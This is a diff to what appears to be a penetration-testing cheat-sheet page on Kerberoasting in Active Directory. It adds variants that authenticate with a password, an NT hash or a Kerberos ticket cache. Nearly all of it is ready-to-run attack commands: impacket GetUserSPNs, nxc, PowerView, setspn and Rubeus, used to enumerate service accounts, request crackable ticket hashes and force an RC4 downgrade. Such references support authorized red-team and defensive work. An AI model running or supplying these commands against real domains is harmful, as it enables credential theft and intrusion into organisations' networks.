@@ -38,21 +38,28 @@ Any authenticated domain user can request a TGS (service ticket) for any account
 Look for user accounts (not computer accounts) with SPNs: service accounts are the target, especially ones with weak passwords.
 
 <Tabs>
-  <Tab title="Linux">
+  <Tab title="Linux — Password">
     ```bash wrap
-    # impacket: list SPNs without requesting tickets
     GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
-
-    # nxc
     nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --kerberoast output.txt
+    ```
+  </Tab>
+  <Tab title="Linux — NT Hash">
+    ```bash wrap
+    GetUserSPNs.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --kerberoast output.txt
+    ```
+  </Tab>
+  <Tab title="Linux — Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    GetUserSPNs.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --kerberoast output.txt
     ```
   </Tab>
   <Tab title="Windows">
     ```powershell wrap
-    # PowerView
     Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, description
-
-    # setspn (built-in)
     setspn -T $DOMAIN -Q */*
     ```
   </Tab>
@@ -61,24 +68,27 @@ Look for user accounts (not computer accounts) with SPNs: service accounts are t
 ## Requesting Hashes
 
 <Tabs>
-  <Tab title="Linux (impacket)">
+  <Tab title="Linux — Password">
     ```bash wrap
-    # Request all Kerberoastable hashes
     GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.txt
-
-    # Request for a specific account
     GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="Linux — NT Hash">
+    ```bash wrap
+    GetUserSPNs.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP -request -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="Linux — Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    GetUserSPNs.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP -request -outputfile hashes.txt
     ```
   </Tab>
   <Tab title="Windows (Rubeus)">
     ```powershell wrap
-    # All accounts
     Rubeus.exe kerberoast /outfile:hashes.txt
-
-    # Specific account
     Rubeus.exe kerberoast /user:$TARGET /outfile:hashes.txt
-
-    # Force RC4 (faster to crack, downgrade if AES is returned)
     Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:hashes.txt
     ```
   </Tab>
